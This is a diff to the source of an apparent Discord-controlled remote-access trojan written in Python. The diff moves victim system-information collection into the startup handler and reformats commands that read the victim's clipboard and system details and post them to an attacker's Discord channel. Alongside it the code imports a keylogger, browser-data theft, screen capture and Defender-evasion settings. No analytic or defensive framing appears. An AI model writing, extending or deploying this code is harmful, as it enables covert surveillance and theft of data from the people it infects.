@@ -2,7 +2,7 @@ import os, discord, subprocess, requests, ctypes, zipfile
 from PIL import ImageGrab, Image
 import cv2
 from tkinter import messagebox
-from config import TOKEN, GUILD_ID, DEFENDER, ERROR#, ANTIDEBUG
+from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE#, ANTIDEBUG
 from modules.browser import run, delete_files
 from modules.keylogger import Keylogger
 #from modules.antidebug import Antidebug
@@ -40,9 +40,6 @@ client = discord.Client(intents=discord.Intents.all())
 session_id = os.urandom(8).hex()
 original_dir = os.getcwd()
 
-start()
-with open("system.txt", "r") as f:
-    system_info = f.read()
     
 commands = "\n".join([
     "help - Help command",
@@ -147,6 +144,13 @@ async def on_ready():
     channel = await guild.create_text_channel(session_id)
     embed = discord.Embed(title="New session created", description="", color=0xfafafa)
     embed.add_field(name="Session ID", value=f"```{session_id}```", inline=True)
+    
+    start()
+    with open("system.txt", "r") as f:
+        system_info = f.read()
+    if system_info == "":
+        system_info = "Failed to fetch system information!"
+    
     embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
     await channel.send(embed=embed)
     delete_files(["system.txt"])
@@ -169,35 +173,35 @@ async def on_message(message):
         await message.reply(content=msg)
 
     elif message.content == "sys":
-            await message.reply("Fetching data...", delete_after=.3)
-            start()
-            with open("system.txt", "r") as f:
-                system_info = f.read()
+        await message.reply("Fetching data...", delete_after=.3)
+        start()
+        with open("system.txt", "r") as f:
+            system_info = f.read()
 
-            if system_info == "":
-                system_info = "Failed to fetch system information!"
-            
-            embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
-            await message.channel.send(embed=embed)
-            delete_files(["system.txt"])
+        if system_info == "":
+            system_info = "Failed to fetch system information!"
+
+        embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
+        await message.channel.send(embed=embed)
+        delete_files(["system.txt"])
     
     elif message.content == "clipboard":
-            try:
-                clipboard = paste()
-            except:
-                clipboard = "Unknown"
-            if clipboard == "":
-                clipboard = "null"
-            elif len(clipboard) > 1500:
-                with open("clipboard.txt", "w", encoding="utf-8") as f:
-                    f.write(clipboard)
-                clipboard_file = discord.File("clipboard.txt")
-                await message.reply(file=clipboard_file)
-                delete_files(["clipboard.txt"])
-                return
-            
-            embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
-            await message.reply(embed=embed)
+        try:
+            clipboard = paste()
+        except:
+            clipboard = "Unknown"
+        if clipboard == "":
+            clipboard = "null"
+        elif len(clipboard) > 1500:
+            with open("clipboard.txt", "w", encoding="utf-8") as f:
+                f.write(clipboard)
+            clipboard_file = discord.File("clipboard.txt")
+            await message.reply(file=clipboard_file)
+            delete_files(["clipboard.txt"])
+            return
+        
+        embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
+        await message.reply(embed=embed)
             
     elif message.content == "processes":
         try: 
